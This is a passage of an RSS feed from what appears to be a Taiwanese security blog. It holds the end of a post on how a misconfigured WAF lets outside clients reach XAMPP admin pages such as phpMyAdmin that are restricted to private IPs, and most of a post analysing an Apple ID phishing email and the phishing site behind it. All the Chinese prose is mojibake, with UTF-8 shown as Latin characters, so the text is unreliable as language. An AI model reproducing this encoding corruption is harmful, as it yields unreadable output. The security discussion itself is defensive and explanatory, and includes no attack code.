&lt;p&gt;åœ¨é€™ç¨®æ¶æ§‹ä¸‹çš„ WAF çœ‹ä¼¼å°å¾Œç«¯çš„ä¼ºæœå™¨å¤šäº†ä¸€ä»½ä¿éšœï¼Œä½†ä¹Ÿä¸¦éå®Œç¾ã€‚å…¶å•é¡Œæ˜¯å¾Œç«¯çš„ Web Server åœ¨é€é WAF å­˜å–çš„æƒ…æ³ä¸‹ï¼Œç„¡æ³•å¾—çŸ¥ä¾†è‡ª Client ç«¯çš„ä¾†æº IPï¼Œç›¸åçš„ Web Server èƒ½çœ‹åˆ°çš„ IP éƒ½å°‡æ˜¯ WAF çš„ IP (REMOTE ADDR)ï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹å¯èƒ½é€ æˆ Client ç«¯å¯ä»¥å­˜å–å— IP ä¾†æºé™åˆ¶çš„ç³»çµ±ã€‚å»¶ä¼¸é–±è®€ï¼š&lt;a href=&quot;http://devco.re/blog/2014/06/19/client-ip-detection/&quot;&gt;å¦‚ä½•æ­£ç¢ºçš„å–å¾—ä½¿ç”¨è€… IPï¼Ÿ&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ä¸‹åœ–ç‚ºä¾‹ï¼Œç¶²ç«™æœ¬èº«åªå…è¨± 192.168.x.x çš„ç¶²æ®µé€£ç·šï¼Œå¦‚æœä»Šå¤© Client IP æ˜¯ 1.1.1.1ï¼Œå°‡ç„¡æ³•å­˜å–è©²ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-01.png&quot; alt=&quot;é™åˆ¶ IP å­˜å–&quot; title=&quot;é™åˆ¶ IP å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æœ‰å»ºç½® WAF çš„æ¶æ§‹ä¹‹ä¸‹ï¼ŒClient é€é WAF å­˜å–ç¶²ç«™ï¼Œç¶²ç«™å¾—åˆ°çš„ IP æœƒæ˜¯ WAF çš„ IPï¼š192.168.1.10ï¼Œå› æ­¤å…è¨±é€£ç·šï¼ŒClient å› è€Œå–å¾—åŸæœ¬éœ€åœ¨å…§ç¶²æ‰èƒ½å­˜å–çš„è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-02.png&quot; alt=&quot;å› ç‚º WAF è€Œç¹é IP é™åˆ¶&quot; title=&quot;å› ç‚º WAF è€Œç¹é IP é™åˆ¶&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;å¯¦éš›æ¡ˆä¾‹&quot;&gt;å¯¦éš›æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘ä»¥å¸¸è¦‹çš„ Web Server æ•´åˆåŒ… XAMPP ç‚ºä¾‹ï¼Œåœ¨é è¨­çš„ http-xampp.conf è¨­å®šæª”ä¸­é™åˆ¶äº†ä¸€äº›ç®¡ç†é é¢åªèƒ½ç”± Private IP å­˜å–ï¼Œå¦‚ /security ã€ /webalizer ã€ /phpmyadmin ã€ /server-status ã€ /server-info ç­‰ï¼Œæ­¤æ™‚ WAF çš„ IP è‹¥ç‚º Private IPï¼Œä¾ XAMPP é è¨­è¨­å®šï¼ŒWAF å°‡å¯ä»¥å­˜å–é€™äº›å— IP é™åˆ¶çš„è³‡æºï¼Œç•¶ WAF å­˜å–å®Œè³‡æºå¾Œåˆå°‡å…§å®¹å›å‚³çµ¦ Client ç«¯ã€‚&lt;/p&gt;

&lt;p&gt;http-xampp.conf é è¨­è¨­å®š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Allow&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; ::1 127.0.0.0/8 \
                fc00::/7 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
                fe80::/10 169.254.0.0/16
         &lt;span class=&quot;nc&quot;&gt;ErrorDocument&lt;/span&gt; 403 /error/XAMPP_FORBIDDEN.html.var
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;LocationMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æœç…§è‘—é è¨­çš„è¨­å®šï¼Œä»¥ç¾æˆçš„æ¡ˆä¾‹ä¾†çœ‹ï¼Œèƒ½å¤ å­˜å– Apache Server çš„ç³»çµ±ç‹€æ…‹ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°ç¶²ç«™æ‰€æœ‰é€£ç·šä»¥åŠ URI ç­‰è³‡æ–™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-05.png&quot; alt=&quot;é è¨­é–‹æ”¾ Apache ä¼ºæœå™¨ç‹€æ…‹&quot; title=&quot;é è¨­é–‹æ”¾ Apache ä¼ºæœå™¨ç‹€æ…‹&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¸¦ä¸”å¯ä»¥ç›´æ¥è®€å– phpMyAdmin ä»‹é¢ï¼Œä¸¦ä¸”è‡³è³‡æ–™åº«ä¸­æ–°å¢ã€ä¿®æ”¹ã€åˆªé™¤è³‡æ–™ï¼Œç”šè‡³ç›´æ¥ä¸Šå‚³ webshell é€²å…¥ä¸»æ©Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-06.png&quot; alt=&quot;ç›´æ¥é€²å…¥ phpMyAdmin ç®¡ç†ä»‹é¢&quot; title=&quot;ç›´æ¥é€²å…¥ phpMyAdmin ç®¡ç†ä»‹é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;XAMPP ä¹Ÿå…§å»ºäº†ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizerï¼Œé€éé€™å€‹ä»‹é¢å¯ä»¥çŸ¥é“ç¶²ç«™æ‰€æœ‰é€²å…¥é»çš„æµé‡ã€çµ±è¨ˆæ•¸æ“šç­‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140718/2014-07-11-waf-configuration-security-issue-09.png&quot; alt=&quot;ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizer&quot; title=&quot;ç¶²ç«™è¨˜éŒ„åˆ†æå·¥å…· webalizer&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;å¦‚æœå»ºç½®äº† WAFï¼Œæœ‰é—œ IP çš„è¨­å®šå¿…é ˆè¦å¾ WAF æ”¯æ´çš„ HTTP Header ä¸­å–å‡ºä½¿ç”¨è€…çš„ IP (REMOTE_ADDR)ï¼Œæ‰èƒ½è®“åŸæœ¬ç¶²ç«™çš„ IP é™åˆ¶ç”Ÿæ•ˆã€‚åœ¨é€™ç¨®è¨­å®šéŒ¯èª¤æˆ–æ˜¯å° WAF æ¶æ§‹ä¸ç­è§£çš„æƒ…æ³ä¸‹ï¼ŒWAF åè€Œæˆç‚ºé§­å®¢ç¹é Private IP é™åˆ¶çš„è·³æ¿ï¼Œå°±å¦‚åŒç‚ºé§­å®¢é–‹äº†ä¸€å€‹å¾Œé–€ã€‚å› æ­¤åœ¨ä½¿ç”¨è³‡å®‰è¨­å‚™æ™‚ï¼Œå¿…é ˆç­è§£å…¶æ¶æ§‹ã€‚åˆ¥è®“è³‡å®‰è¨­å‚™ã€å®‰å…¨æ©Ÿåˆ¶ï¼Œåè€Œä½¿å¾—ä¼ºæœå™¨æ›´ä¸å®‰å…¨ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/18/waf-configuration-security-issue/</link>
                <guid>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</guid>
                <pubDate>Fri, 18 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Apple ID é‡£é­šéƒµä»¶æ¡ˆä¾‹</title>
                <description>&lt;p&gt;ä»Šå¤©åˆæœ‰ä¸æ€•æ­»çš„äººå¯„ä¾†é‡£é­šä¿¡äº†ï¼Œé€™æ¬¡æ˜¯é¨™å– Apple IDã€‚è®“æˆ‘å€‘ä¾†çœ‹çœ‹é€™å°ä¿¡ï¼Œå…¶ä¸­å…§å®¹æœ‰éå¸¸å¤šç ´ç¶»ï¼Œä¹Ÿå·²ç¶“è¢« Gmail ç›´æ¥å®šç‚º Spam äº†ï¼Œéå¸¸å¯æ†ã€‚é™¤äº†ä¿¡ä»¶ä¹‹å¤–ï¼Œé‡£é­šçš„ç¶²é æœ¬èº«ä¹Ÿå¾ˆå€¼å¾—æˆ‘å€‘å€Ÿé¡ï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹é€™æ¬¡çš„é‡£é­šéƒµä»¶æ¡ˆä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-01.png&quot; alt=&quot;Apple ID é‡£é­šä¿¡&quot; title=&quot;Apple ID é‡£é­šä¿¡&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢&quot;&gt;å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å…ˆä¾†è«‡è«‡è¦å¦‚ä½•åˆ¤åˆ¥é‡£é­šä¿¡å‘¢ã€‚æˆ‘å€‘å¯ä»¥å¾å››å€‹è¦ç´ ä¾†çœ‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ¨™é¡Œ&lt;/li&gt;
  &lt;li&gt;å¯„ä»¶è€…&lt;/li&gt;
  &lt;li&gt;å…§æ–‡&lt;/li&gt;
  &lt;li&gt;é€£çµ&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;æ¨™é¡Œ&quot;&gt;æ¨™é¡Œ&lt;/h4&gt;

&lt;p&gt;é¦–å…ˆï¼Œé€™å°ä¿¡çš„æ¨™é¡Œéå¸¸å‡ï¼Œä¸€èˆ¬ä¾†èªªå…¬å¸ä¸æœƒä½¿ç”¨é€™é¡æ¨™é¡Œï¼Œé€™ç¨®åˆ¤æ–·æ¯”è¼ƒéœ€è¦ç¶“é©—ã€‚é‡£é­šä¿¡ä»¶æœƒä½¿ç”¨éå¸¸è³å‹•ã€å¸å¼•ä½ å»åšå‹•ä½œçš„æ¨™é¡Œã€‚ä¾‹å¦‚å¸¸è¦‹çš„ã€Œä½ çš„å¸³è™Ÿé­åˆ°åœç”¨ã€ã€ã€Œæ›´æ›å¸³è™Ÿè³‡è¨Šé€šçŸ¥ã€ç­‰ã€‚é»ä¸‹é€£çµå°±æœƒå¸¶ä½ å»å‡é€ çš„é é¢é¨™ä½ è¼¸å…¥å¯†ç¢¼ï¼Œåƒè¬åˆ¥å‚»å‚»ç•¶çœŸã€‚&lt;/p&gt;

&lt;h4 id=&quot;å¯„ä»¶è€…&quot;&gt;å¯„ä»¶è€…&lt;/h4&gt;

&lt;p&gt;å¯„ä»¶è€…é€šå¸¸æ˜¯é‡£é­šä¿¡ä¸€å®šæœƒåŠ å¼·å‡é€ çš„éƒ¨åˆ†ï¼Œåˆ©ç”¨å®˜æ–¹å­˜åœ¨çš„ä¿¡ç®±æˆ–æ˜¯ä»–äººçš„ä¿¡ç®±å¯„ä¿¡ï¼ŒåŠ å¼·ä½ çš„ä¿¡ä»»ã€‚ä¸ééœ€è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;å¯„ä»¶è€…çš„æ¬„ä½æ˜¯å¯ä»¥å‡é€ ã€éš¨æ„å¡«å¯«çš„ï¼Œåƒè¬ä¸è¦ç›´æ¥ä¿¡ä»»ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä»¥é€™å°ä¿¡ç‚ºä¾‹ï¼Œå¯„ä»¶è€…ã€Œservice@apple.comã€æ˜¯ä¸å­˜åœ¨çš„ã€‚ç•¶ç„¶é€™å€‹æ¬„ä½å¯ä»¥å‡é€ ï¼Œä½†é€£å‡é€ éƒ½éŒ¯ï¼Œå¯¦åœ¨æ˜¯éå¸¸ä¸ç”¨å¿ƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;å…§æ–‡&quot;&gt;å…§æ–‡&lt;/h4&gt;

&lt;p&gt;ä¿¡ä»¶çš„å…§æ–‡å°±æ˜¯ç²¾è¯äº†ï¼Œè¦æ€éº¼åšå‡ºä¸€å°å¾ˆåƒå®˜æ–¹çš„ä¿¡ä»¶ï¼Œåˆè¦èª˜ä½¿äººå»é»é¸ï¼Œå¯¦åœ¨æ˜¯ä¸€é–€è—è¡“ã€‚ç²¾å¿ƒè¨­è¨ˆçš„é‡£é­šä¿¡ã€ç¤¾äº¤å·¥ç¨‹ã€APT éƒµä»¶ï¼Œé€šå¸¸éƒ½æœƒé‡å°å—å®³è€…å®¢è£½åŒ–ï¼Œèª¿æŸ¥èº«é‚Šçš„ç¤¾äº¤åœˆã€å¸¸è«‡çš„è©±é¡Œã€å¸¸ç”¨çš„æœå‹™ã€æœƒé»æ“Šçš„éƒµä»¶ï¼Œä¾†è£½é€ ä¸€å€‹ä¸€å®šæœƒä¸­ççš„ä¿¡ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶å¾ˆå¤šæ™‚å€™æ”»æ“Šè€…èª¿æŸ¥ä¸è¶³ï¼Œé‚„æ˜¯æœƒå‡ºç¾è››çµ²é¦¬è·¡çš„ã€‚ä¾‹å¦‚ä¾†è‡ªä¸­åœ‹çš„æƒ¡æ„éƒµä»¶ï¼Œå¸¸æœƒå‡ºç¾ã€Œ&lt;strong&gt;å°Šæ•¬çš„ç”¨æˆ¶æ‚¨å¥½&lt;/strong&gt;ã€é€™ç¨®åœ¨å°ç£äººçœ¼ä¸­çœ‹äº†å¾ˆå½†æ‰­çš„è©å½™ã€‚å¦‚æœå‡ºç¾äº†ä¸å¸¸è¦‹çš„ç”¨è©ï¼Œå°±éå¸¸æœ‰å¯èƒ½æ˜¯ä¸€å€‹å‡é€ çš„æƒ¡æ„éƒµä»¶ï¼Œåƒè¬ä¸è¦å‚»å‚»çš„é»é¸é€£çµæˆ–é™„ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;å†å›é ­ä¾†ä»¥é€™å°ä¿¡ç‚ºä¾‹ï¼Œæœ€å¤§çš„ç ´ç¶»é™¤äº†éåˆ¶å¼çš„å…§æ–‡ä¹‹å¤–ï¼Œå°±å±¬ç½²åäº†ã€‚æ˜æ˜æ˜¯å‡é€ ã€ŒApple Customer Supportã€çš„ä¾†ä¿¡ï¼Œæœ€ä¸‹é¢å»ç°½ç½²ã€ŒMicrosoft Privacy and cookies Developersã€ï¼Œæœ‰æ²’æœ‰æéŒ¯ï¼Ÿå¯ä»¥å†ç”¨é»å¿ƒå—ï¼Ÿ&lt;/p&gt;

&lt;h4 id=&quot;é€£çµ&quot;&gt;é€£çµ&lt;/h4&gt;

&lt;p&gt;æœ€å¾Œçš„é‡é»å°±æ˜¯ä¿¡ä»¶ä¸­çš„é‡£é­šé€£çµäº†ï¼Œé€šå¸¸é€™å€‹é€£çµæœƒå¸¶ä½ å‰å¾€ä¸€å€‹é•·å¾—è·Ÿå®˜æ–¹ç¶²ç«™ä¸€æ¨¡ä¸€æ¨£çš„ç™»å…¥é é¢ï¼Œé¨™ä½ è¼¸å…¥å¸³è™Ÿå¯†ç¢¼ç™»å…¥ä¾†ç«Šå–ã€‚åœ¨é»é¸è¶…é€£çµä¹‹å‰ï¼Œä¸€å®šè¦å…ˆçœ‹ä¸€ä¸‹é€™å€‹é€£çµå‰å¾€çš„ä½ç½®æ˜¯ä¸æ˜¯å®˜æ–¹çš„ä½ç½®ï¼Œä¾‹å¦‚æ˜¯ Apple çš„ä¿¡ä»¶é€šå¸¸å°±æœƒæ˜¯å‰å¾€ Apple.com è‡ªå·±çš„ç¶²åŸŸåç¨±ã€‚ç•¶ç„¶æ›´è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯å‡é€ çš„ç¶²åŸŸåç¨±ï¼Œä¾‹å¦‚ä½¿ç”¨ã€ŒApp1e.comã€ä¾†å½è£æˆã€ŒApple.comã€ï¼Œä¹Ÿæ˜¯éå¸¸å¸¸è¦‹çš„ã€‚&lt;/p&gt;

&lt;p&gt;é€™å°ä¿¡ä¸­ä½¿ç”¨äº†æœ€ä¸ç”¨å¿ƒçš„ç”¨æ³•ï¼Œå°±æ˜¯ç›´æ¥æ‹¿é‡£é­šç¶²ç«™çš„ URL ä¾†ç•¶é€£çµï¼Œä¸€ä¾†é•·å¾—è·Ÿå®˜æ–¹ç¶²åŸŸæ ¹æœ¬ä¸åƒï¼ŒäºŒä¾†è½è½é•·çš„é€£çµï¼Œåˆ°åº•æ˜¯æƒ³è¦é¨™èª°é»é¸å‘¢ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;ä¿¡ä»¶æ¨™é ­è—æœ‰æ”»æ“Šè€…çš„è››çµ²é¦¬è·¡&quot;&gt;ä¿¡ä»¶æ¨™é ­è—æœ‰æ”»æ“Šè€…çš„è››çµ²é¦¬è·¡&lt;/h3&gt;

&lt;p&gt;æ”¶åˆ°æƒ¡æ„éƒµä»¶ã€é‡£é­šéƒµä»¶ï¼Œä¸€å®šè¦å¥½å¥½çœ‹ä¿¡ä»¶çš„æ¨™é ­æª”ï¼ˆHeaderï¼‰ã€‚è£¡é¢é€šå¸¸å¯ä»¥çœ‹åˆ°æ”»æ“Šè€…ç™¼ä¿¡çš„ä¾†æºï¼Œä¾‹å¦‚æ˜¯è‡ªå·±æ¶è¨­çš„ç™¼ä¿¡ä¼ºæœå™¨æˆ–è€…æ˜¯ä½¿ç”¨è‚‰é›ä¾†ç™¼ä¿¡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID é‡£é­šä¿¡ Header&quot; title=&quot;Apple ID é‡£é­šä¿¡ Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¿¡ä»¶æ¨™é ­æœ€é‡è¦çš„å°±æ˜¯ã€ŒReceivedã€é€™å€‹éƒ¨åˆ†ï¼Œè¦ç”±ä¸‹å¾€ä¸Šé–±è®€ã€‚å¾é€™é‚Šæˆ‘å€‘å¯ä»¥çœ‹åˆ°ä¿¡ä»¶çš„æµå‘ï¼Œå¾æ”»æ“Šç™¼èµ·è€…åˆ°ç™¼ä¿¡ä¼ºæœå™¨ï¼Œä¸­é–“ç¶“éå…¶ä»–ä¼ºæœå™¨çš„è½‰é€ï¼Œæœ€å¾Œåˆ°æ”¶åˆ°é‡£é­šä¿¡ä»¶çš„éƒµä»¶ä¼ºæœå™¨ã€‚å› æ­¤å¾æœ€ä¸‹é¢çš„ Received ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“æ”»æ“Šè€…æ˜¯å¾ã€Œselecttr@cloud.httpdns.coã€ä¾†å¯„é€ä¿¡ä»¶çš„ï¼Œå› æ­¤ cloud.httpdns.co å¾ˆæœ‰å¯èƒ½å°±æ˜¯æ”»æ“Šè€…çš„ä¼ºæœå™¨ï¼Œæˆ–è€…æ˜¯è¢«é§­ä¾†ç™¼ä¿¡çš„ä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœè¦ºå¾—ä¿¡ä»¶çš„æ¨™é ­å¤ªé•·é›£ä»¥é–±è®€ï¼Œå¯ä»¥åˆ©ç”¨ Google æä¾›çš„å·¥å…·ã€Œ&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;ã€ã€‚åªè¦æŠŠä¿¡ä»¶çš„æ¨™é ­è²¼ä¸Šï¼Œä»–å°±æœƒè‡ªå‹•åˆ†æä¿¡ä»¶çš„æµå‘ï¼Œå¦‚ä¸‹åœ–ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;æª¢æŸ¥ä¿¡ä»¶ header&quot; title=&quot;æª¢æŸ¥ä¿¡ä»¶ header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é‡£é­šç¶²é ä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Š&quot;&gt;é‡£é­šç¶²é ï¼Œä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Šã€‚&lt;/h3&gt;

&lt;p&gt;æ¥è‘—æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹é‡£é­šé é¢ã€‚é€šå¸¸ã€Œæ­£å¸¸ã€çš„é‡£é­šé é¢éƒ½æœƒåšå¾—è·Ÿå®˜æ–¹ä¸€æ¨¡ä¸€æ¨£ï¼Œå› ç‚ºé€šå¸¸æ”»æ“Šè€…éƒ½æœƒç›´æ¥æŠŠå®˜æ–¹ç¶²ç«™ä¸Šé¢çš„ HTML ç›´æ¥ä¸‹è¼‰ä¸‹ä¾†ä¿®æ”¹ã€‚å¦‚æœæœ‰åšå¾—ä¸åƒçš„ï¼Œå°±çœŸçš„æ˜¯å¤ªä¸ç”¨å¿ƒçš„æ”»æ“Šè€…ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥çœ‹åˆ°é€™å€‹é‡£é­šé é¢åšå¾—éå¸¸åƒï¼Œä¸Šé¢è¦ä½ è¼¸å…¥å¸³è™Ÿã€å¯†ç¢¼ã€å§“åã€ç”Ÿæ—¥ã€ä¿¡ç”¨å¡è™Ÿç­‰è³‡è¨Šï¼Œéå¸¸æƒ¡åŠ£ã€‚å”¯æœ‰ç¶²å€å¯¦åœ¨æ˜¯å¤ªå‡ï¼Œå¸Œæœ›æ²’æœ‰äººçœ¼æ‹™çœŸçš„ä»¥ç‚ºé€™æ˜¯ Apple çš„ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID é‡£é­šç¶²é &quot; title=&quot;Apple ID é‡£é­šç¶²é &quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç§‰æŒçš„è³‡å®‰ç ”ç©¶å“¡çš„å¥½ç¿’æ…£ï¼Œæˆ‘å€‘æŠŠç¶²å€å­ç›®éŒ„å»æ‰ï¼Œçœ‹çœ‹ç¶²ç«™çš„æ ¹ç›®éŒ„é•·ä»€éº¼æ¨£å­ï¼Œçµæœè®“äººè·Œç ´çœ¼é¡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;é‡£é­šç¶²é é–‹æ”¾ç›®éŒ„ç€è¦½&quot; title=&quot;é‡£é­šç¶²é é–‹æ”¾ç›®éŒ„ç€è¦½&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é‡£é­šç¶²ç«™ä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Šï¼&lt;/strong&gt;é€™å€‹ç¶²ç«™å¤§å‰Œå‰Œçš„é–‹è‘—ç›®éŒ„ç´¢å¼•ï¼Œè®“æˆ‘å€‘å¯ä»¥çœ‹åˆ°ç¶²ç«™ä¸Šçš„å„å€‹ç›®éŒ„ã€æª”æ¡ˆã€‚é™¤äº† Apple çš„é‡£é­šç¶²é ä¹‹å¤–ï¼Œç”šè‡³æœ‰é‡£é­šç¶²é çš„åŸå§‹ç¢¼ã€Œconnect-info.zipã€ï¼Œæ›´æœ‰è‘—å…¶ä»–é‡£é­šç¶²é åœ¨åŒå€‹ç«™ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;ç«™ä¸Šå…¶ä»–é‡£é­šé é¢&quot; title=&quot;ç«™ä¸Šå…¶ä»–é‡£é­šé é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ—¢ç„¶å¯ä»¥ç€è¦½ï¼Œé‚£æˆ‘å€‘ä¾†çœ‹çœ‹é‡£é­šç¶²é çš„åŸå§‹ç¢¼å¯«å¾—æ€æ¨£ã€‚æŠ“ä¸‹ä¾†è§£é–‹ä¹‹å¾Œæœƒçœ‹åˆ°å®Œæ•´çš„é‡£é­šç¶²é ï¼Œä»¥åŠæ¥æ”¶å—é¨™äººè³‡æ–™çš„ä¸»ç¨‹å¼ã€ŒSnd.phpã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;ä¸‹è¼‰é‡£é­šç¶²é åŸå§‹ç¢¼&quot; title=&quot;ä¸‹è¼‰é‡£é­šç¶²é åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é‡£é­šç¶²é çš„ç¨‹å¼å¯«å¾—éå¸¸ç°¡å–®ï¼Œåƒ…æŠŠç¶²é ä¸Šæ¥æ”¶åˆ°çš„è¢«å®³äººè³‡æ–™ã€IPï¼Œå¯„é€åˆ°ä»–çš„ä¿¡ç®±ã€Œ justforhacke@gmail.com ã€ï¼Œå¯„é€å®Œç•¢å¾Œæœƒè‡ªå‹•å°å‘åˆ°å®˜æ–¹çš„é é¢å½è£ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼&quot; title=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœé‡£é­šç¶²é å¯«å¾—ä¸å¥½ï¼Œç”šè‡³æˆ‘å€‘æœ‰æ©Ÿæœƒå¯ä»¥æ”»æ“Šä»–é‡£é­šç¶²é ä¸Šçš„æ¼æ´ï¼Œç›´æ¥å–å¾—ä¸»æ©Ÿçš„æ¬Šé™ï¼Œè§£æ•‘ä¸–äººã€‚å¾åŸå§‹ç¢¼æˆ‘å€‘ä¸€ç›®äº†ç„¶é‡£é­šç¶²é çš„è¡Œç‚ºã€å¯«æ³•ï¼Œä¹Ÿå¯ä»¥å°‹æ‰¾æœ‰ç„¡æ”»æ“Šçš„æ©Ÿæœƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼å‚™ä»½&quot;&gt;é‡£é­šç¶²é åŸå§‹ç¢¼å‚™ä»½&lt;/h4&gt;

